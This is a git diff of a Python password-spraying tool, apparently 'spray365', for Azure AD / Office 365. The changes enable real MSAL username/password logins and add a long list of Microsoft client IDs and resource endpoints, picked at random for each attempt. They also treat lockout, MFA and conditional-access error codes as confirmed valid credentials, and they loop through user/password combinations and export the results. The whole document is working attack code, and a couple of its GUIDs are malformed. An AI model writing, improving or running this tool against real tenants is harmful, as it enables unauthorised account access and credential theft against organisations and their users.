@@ -1,5 +1,4 @@
 from msal import PublicClientApplication
-import msal
 from colorama import Fore
 import os
 import sys
@@ -10,8 +9,14 @@ import itertools
 import json
 from json import JSONEncoder
 
+version = "0.0.1-alpha"
+
 
 class Credential:
+    auth_timestamp = None
+    auth_trace_id = None
+    auth_correlation_id = None
+
     def __init__(self, domain, username, password, client_id, endpoint, delay, initial_delay=0):
         self.domain = domain
         self.username = username
@@ -26,27 +31,49 @@ class Credential:
         return "%s@%s" % (self.username, self.domain)
 
     def authenticate(self, proxies, verify_ssl):
-        global auth_app
 
-        scopes = ["%s/.default" % self.endpoint]
+        auth_app = PublicClientApplication(
+            self.client_id[1], authority="https://login.microsoftonline.com/organizations")
 
-        # raw_result = auth_app.acquire_token_by_username_password(
-        #    username=self.email_address, password=self.password, scopes=scopes)
+        scopes = ["%s/.default" %
+                  "https://login.microsoftonline.com/organizations"]
 
-        raw_result = {
-            "error": True,
-            "error_description": "Something magical",
-            "error_codes": [
-                50126,
-                50127
-            ]
-        }
+        print_spray_cred_output(self)
+        raw_result = auth_app.acquire_token_by_username_password(
+            username=self.email_address, password=self.password, scopes=scopes)
 
-        result = AuthResult(self)
+        if "timestamp" in raw_result:
+            self.auth_timestamp = raw_result["timestamp"]
 
-        if "error" not in raw_result:
-            result.set_auth_status(complete_success=True, partial_success=None)
-            return result
+        if "trace_id" in raw_result:
+            self.auth_trace_id = raw_result["trace_id"]
+
+        if "correlation_id" in raw_result:
+            self.auth_correlation_id = raw_result["correlation_id"]
+
+        # Error codes that also indicate a successful login; see: https://github.com/AzureAD/microsoft-authentication-library-for-dotnet/wiki/Client-Applications#common-invalid-client-errors
+        auth_complete_success_error_codes = [7000218]
+        auth_partial_success_error_codes = [
+            50053,
+            50055,
+            50057,
+            50158,
+            50076
+        ]
+
+        auth_complete_success = False
+        auth_partial_success = False
+
+        if any(e in raw_result["error_codes"] for e in auth_complete_success_error_codes):
+            auth_complete_success = True
+            auth_partial_success = True
+            raw_result.pop("error")  # remove the error
+        elif any(e in raw_result["error_codes"] for e in auth_partial_success_error_codes):
+            auth_partial_success = True
+
+        result = AuthResult(credential=self)
+        result.set_auth_status(
+            complete_success=auth_complete_success, partial_success=auth_partial_success)
 
         if "error_codes" in raw_result:
             result.error_codes = raw_result["error_codes"]
@@ -55,6 +82,7 @@ class Credential:
             result.raw_error_description = raw_result["error_description"]
 
         result.process_errors()
+        print_spray_cred_output(self, result)
         return result
 
 
@@ -83,7 +111,7 @@ class AuthError:
 class AuthResult:
     _auth_complete_success = False
     _auth_partial_success = False
-    _auth_errors = []
+    _auth_error = None
 
     credential = None
     raw_error_description = None
@@ -101,36 +129,39 @@ class AuthResult:
         return self._auth_complete_success
 
     @property
-    def auth_errors(self):
-        return self._auth_errors
+    def auth_error(self):
+        return self._auth_error
+
+    def set_auth_status(self, complete_success, partial_success):
+        self._auth_complete_success = complete_success
+        self._auth_partial_success = partial_success
 
     def process_errors(self):
-        for error_code in self.error_codes:
-            message = None
+        # Take only the first error code
+        error_code = self.error_codes[0]
+        message = None
 
-            if error_code == 50034:
-                message = "User not found"
-            elif error_code == 50053:
-                message = "Account locked"
-            elif error_code == 50055:
-                message = "Account password expired"
-            elif error_code == 50057:
-                message = "Account disabled"
-            elif error_code == 50158:
-                message = "External validation failed (conditional access policy)"
-            elif error_code == 50076:
-                message = "Multi-Factor Authentication Required"
-            elif error_code == 50126:
-                message = "Invalid credentials"
-            else:
-                message = "An unknown error occurred"
+        if error_code == 50034:
+            message = "User not found"
+        elif error_code == 50053:
+            message = "Account locked"
+        elif error_code == 50055:
+            message = "Account password expired"
+        elif error_code == 50057:
+            message = "Account disabled"
+        elif error_code == 50158:
+            message = "External validation failed (conditional access policy)"
+        elif error_code == 50076:
+            message = "Multi-Factor Authentication Required"
+        elif error_code == 50126:
+            message = "Invalid credentials"
+        else:
+            message = "An unknown error occurred"
 
-            self._auth_errors.append(AuthError(message, error_code))
+        self._auth_error = AuthError(message, error_code)
 
 
 def print_banner():
-
-    version = "0.0.1-alpha"
 
     possible_colors = [
         Fore.CYAN,
@@ -229,7 +260,6 @@ def initialize():
 def validate_args(args):
     if args.generate is not None:
         # Validate args needed for generation
-
         generate_arg_valid = args.generate is not None and not os.path.isfile(
             args.generate)
 
@@ -292,14 +322,17 @@ def validate_args(args):
             sys.exit(1)
 
 
-def get_credential_combinations(domain, usernames, passwords, client_ids, endpoints, delay):
+def get_credential_combinations(domain, usernames, passwords, client_ids, endpoint_ids, delay):
     combinations = []
+
+    client_id_values = list(client_ids.items())
+    endpoint_id_values = list(endpoint_ids.items())
 
     for password in passwords:
         for username in usernames:
             combinations.append(
                 Credential(domain, username, password, random.choice(
-                    client_ids), random.choice(endpoints), delay)
+                    client_id_values), random.choice(endpoint_id_values), delay)
             )
     return combinations
 
@@ -347,6 +380,14 @@ def get_spray_runtime(auth_creds):
     return runtime
 
 
+def process_custom_aad_values(prefix, input_str):
+    values = input_str.split(",")
+    result = {}
+    for i in range(len(values)):
+        result["%s%d" % (prefix, i + 1)] = values[i]
+    return result
+
+
 def generate_execution_plan(args):
     password_list = []
     user_list = []
@@ -366,25 +407,79 @@ def generate_execution_plan(args):
     print_info("Generating execution plan for %d credentials.." %
                (len(user_list) * len(password_list)))
 
-    # print_info("Password spraying %d users with %d password(s) using a %d second delay on %s" % (
-    #    len(user_list), len(password_list), delay, domain))
-
     spray_duration = len(user_list) * len(password_list) * delay
-    # spray_completion_datetime = (datetime.datetime.now(
-    # ) + datetime.timedelta(seconds=spray_duration)).strftime("%Y-%m-%d %H:%M:%S")
 
-    # print_info("Password spraying will take at least %d seconds, and will complete by %s (approximately)" % (
-    #    spray_duration, spray_completion_datetime))
+    # Source: https://github.com/Gerenios/AADInternals/blob/master/AccessToken_utils.ps1
+    endpoint_ids = {
+        "aad_graph_api": "https://graph.windows.net",
+        "azure_mgmt_api": "https://management.azure.com",
+        "cloudwebappproxy": "https://proxy.cloudwebappproxy.net/registerapp",
+        "ms_graph_api": "https://graph.microsoft.com",
+        "msmamservice": "https://msmamservice.api.application",
+        "office_mgmt": "https://manage.office.com",
+        "officeapps": "https://officeapps.live.com",
+        "outlook": "https://outlook.office365.com",
+        "sara": "https://api.diagnostics.office.com",
+        "spacesapi": "https://api.spaces.skype.com",
+        "webshellsuite": "https://webshell.suite.office.com",
+        "windows_net_mgmt_api": "https://management.core.windows.net"
+    }
 
-    endpoint = "https://proxy.cloudwebappproxy.net/registerapp"
-    client_id = "0000000c-0000-0000-c000-000000000000"
+    client_ids = {
+        "aad_account": "0000000c-0000-0000-c000-000000000000",
+        "aad_brokerplugin": "6f7e0f60-9401-4f5b-98e2-cf15bd5fd5e3",
+        "aad_cloudap": "38aa3b87-a06d-4817-b275–7a316988d93b",
+        "aad_join": "b90d5b8f-5503-4153-b545-b31cecfaece2",
+        "aad_pinredemption": "06c6433f-4fb8-4670-b2cd-408938296b8e",
+        "aadconnectv2": "6eb59a73-39b2-4c23-a70f-e2e3ce8965b1",
+        "aadrm": "90f610bf-206d-4950-b61d-37fa6fd1b224",
+        "aadsync": "cb1056e2-e479-49de-ae31-7812af012ed8",
+        "adibizaux": "74658136-14ec-4630-ad9b-26e160ff0fc6",
+        "apple_internetaccounts": "f8d98a96-0999-43f5-8af3-69971c7bb423",
+        "az": "1950a258-227b-4e31-a9cf-717495945fc2",
+        "azure_mgmt": "84070985-06ea-473d-82fe-eb82b4011c9d",
+        "azure_mobileapp_android": "0c1307d4-29d6-4389-a11c-5cbe7f65d7fa",
+        "azureadmin": "c44b4083-3bb0-49c1-b47d-974e53cbdf3c",
+        "azuregraphclientint": "7492bca1-9461-4d94-8eb8-c17896c61205",
+        "azuremdm": "29d9ed98-a469-4536-ade2-f981bc1d605e",
+        "dynamicscrm": "00000007-0000-0000-c000-000000000000",
+        "exo": "a0c73c16-a7e3-4564-9a95-2bdf47383716",
+        "graph_api": "1b730954-1685-4b74-9bfd-dac224a7b894",
+        "intune_mam": "6c7e8096-f593-4d72-807f-a5f86dcc9c77",
+        "ms_authenticator": "4813382a-8fa7-425e-ab75-3b753aab3abb",
+        "ms_myaccess": "19db86c3-b2b9-44cc-b339-36da233a3be2",
+        "msdocs_tryit": "7f59a773-2eaf-429c-a059-50fc5bb28b44",
+        "msmamservice": "27922004-5251-4030-b22d-91ecd9a37ea4",
+        "o365exo": "00000002-0000-0ff1-ce00-000000000000",
+        "o365spo": "00000003-0000-0ff1-ce00-000000000000",
+        "o365suiteux": "4345a7b9-9a63-4910-a426-35363201d503",
+        "office": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
+        "office_mgmt": "389b1b32-b5d5-43b2-bddc-84ce938d6737",
+        "office_mgmt_mobile": "00b41c95-dab0-4487-9791-b9d2c32c80f2",
+        "office_online": "bc59ab01-8403-45c6-8796-ac3ef710b3e3",
+        "office_online2": "57fb890c-0dab-4253-a5e0-7188c88b2bb4",
+        "onedrive": "ab9b8c07-8f02-4f72-87fa-80105867a763",
+        "patnerdashboard": "4990cffe-04e8-4e8b-808a-1175604b879",
+        "powerbi_contentpack": "2a0c3efa-ba54-4e55-bdc0-770f9e39e9ee",
+        "pta": "cb1056e2-e479-49de-ae31-7812af012ed8",
+        "sara": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
+        "skype": "d924a533-3729-4708-b3e8-1d2445af35e3",
+        "sp_mgmt": "9bc3ab49-b65d-410a-85ad-de819febfddc",
+        "synccli": "1651564e-7ce4-4d99-88be-0a65050d8dc3",
+        "teams": "1fec8e78-bce4-4aaf-ab1b-5451cc387264",
+        "teams_client": "1fec8e78-bce4-4aaf-ab1b-5451cc387264",
+        "teamswebclient": "5e3ce6c0-2b1f-4285-8d4b-75ee78787346",
+        "webshellsuite": "89bee1f7-5e6e-4d8a-9f3d-ecd601259da7",
+        "windows_configdesigner": "de0853a1-ab20-47bd-990b-71ad5077ac7b",
+        "www": "00000006-0000-0ff1-ce00-000000000000",
+    }
 
-    '''
-    global auth_app
-    auth_app = PublicClientApplication(
-        client_id,
-        authority="https://login.microsoftonline.com/organizations")
-    '''
+    if args.aad_client:
+        client_ids = process_custom_aad_values("custom_cid_", args.aad_client)
+
+    if args.aad_endpoint:
+        endpoint_ids = process_custom_aad_values(
+            "custom_eid_", args.aad_endpoint)
 
     auth_creds = {}
 
@@ -398,7 +493,7 @@ def generate_execution_plan(args):
             print_info("Generated potential execution plan %d/%d" %
                        (i+1, optimization_tries))
             raw_combinations = get_credential_combinations(
-                domain, user_list, password_list, [client_id], [endpoint], delay)
+                domain, user_list, password_list, client_ids, endpoint_ids, delay)
             # Generate all combinations of users passwords, then
             # Group them into entire sets of users
             auth_combinations_by_user = group_credential_combinations_by_key(
@@ -439,23 +534,22 @@ def generate_execution_plan(args):
 
         print_info("Optimal execution plan identified (#%d)" %
                    (fastest_runtime[1]+1))
-        print_info("Fastest runtime will take %d seconds, %d seconds faster than the slowest execution plan generated" % (
+        print_info("Spraying will take %d seconds, %d seconds faster than the slowest execution plan generated" % (
             fastest_runtime[0],
             (slowest_runtime[0] - fastest_runtime[0])
-
         ))
-        print_info("Using this randomized execution plan will take %d seconds longer than spraying with the non-random approach" %
+        print_info("This random execution plan will take %d seconds longer than spraying with a simple (non-random) execution plan" %
                    (fastest_runtime[0] - spray_duration))
 
     else:
         raw_combinations = get_credential_combinations(
-            domain, user_list, password_list, [client_id], [endpoint], delay)
+            domain, user_list, password_list, client_ids, endpoint_ids, delay)
 
         auth_combinations_by_password = group_credential_combinations_by_key(
             raw_combinations, lambda cred: cred.password)
         auth_creds = auth_combinations_by_password
-        print_info("Basic execution plan identified")
-        print_info("Fastest runtime will take %d seconds" % spray_duration)
+        print_info("Simple execution plan identified")
+        print_info("Spraying will take %d seconds" % spray_duration)
 
     # Save the execution plan, auth_creds to a file
 
@@ -482,16 +576,20 @@ def generate_execution_plan(args):
 
 
 def decode_execution_plan_item(credential_dict):
-    return Credential(
-        credential_dict["domain"],
-        credential_dict["username"],
-        credential_dict["password"],
-        credential_dict["client_id"],
-        credential_dict["endpoint"],
-        credential_dict["delay"],
-        credential_dict["initial_delay"],
+    return Credential(**credential_dict)
 
-    )
+
+def export_auth_results(auth_results):
+    export_file = "spray365_results_%s.json" % datetime.datetime.now().strftime(
+        "%Y-%m-%d_%H-%M-%S")
+
+    json_execution_plan = json.dumps(
+        auth_results, default=lambda o: o.__dict__)
+    with open(export_file, "w") as execution_plan_file:
+        execution_plan_file.write(json_execution_plan)
+
+    print_info("Authentication results file '%s'" %
+               export_file)
 
 
 def spray_execution_plan(args):
@@ -538,6 +636,21 @@ def spray_execution_plan(args):
     else:
         print_warning("Lockout threshold is disabled")
 
+    print_info("Starting to spray credentials")
+
+    global global_spray_size
+    global_spray_size = len(auth_creds)
+
+    global global_spray_idx
+    global_spray_idx = 1
+
+    auth_results = []
+    for attempt_idx, attempt in enumerate(auth_creds):
+        result = attempt.authenticate(None, None)
+        auth_results.append(result)
+        global_spray_idx += 1
+    export_auth_results(auth_results)
+
 
 def main(args):
     generate_mode = args.generate is not None
@@ -546,8 +659,6 @@ def main(args):
         generate_execution_plan(args)
     else:
         spray_execution_plan(args)
-
-    x = 1
 
 
 def print_error(message, fatal=True):
@@ -562,11 +673,45 @@ def print_warning(message):
 
 
 def print_info(message, success=False):
-    print("%s[%s - INFO]: %s%s" %
+    print("%s[%s - INFO]: %s" %
           (Fore.LIGHTBLUE_EX,
            get_time_str(),
-           Fore.LIGHTGREEN_EX if success else Fore.LIGHTBLUE_EX,
            message))
+
+
+def print_spray_cred_output(credential, auth_result=None):
+    if auth_result is None:
+        status = "%s(...)" % Fore.BLUE
+    elif auth_result.auth_complete_success:
+        status = "%s(Success)" % Fore.GREEN
+    elif auth_result.auth_partial_success:
+        status = "%s(Partial Success)" % Fore.LIGHTYELLOW_EX
+    else:
+        status = "%s(Failed: %s)" % (
+            Fore.RED, auth_result.auth_error.error_message)
+
+    spray_index = str(global_spray_idx).zfill(len(str(global_spray_size)))
+
+    suffix = "\r" if not auth_result else None
+
+    print("%s[%s - SPRAY %s/%d] (%s%s%s->%s%s%s): %s%s / %s%s %s" %
+          (
+              Fore.LIGHTBLUE_EX,
+              get_time_str(),
+              spray_index,
+              global_spray_size,
+              Fore.LIGHTCYAN_EX,
+              credential.client_id[0],
+              Fore.LIGHTBLUE_EX,
+              Fore.LIGHTGREEN_EX,
+              credential.endpoint[0],
+              Fore.LIGHTBLUE_EX,
+              Fore.LIGHTMAGENTA_EX,
+              credential.username,
+              Fore.LIGHTMAGENTA_EX,
+              credential.password,
+              status
+          ), end=suffix, flush=True if auth_result else False)
 
 
 def get_time_str():
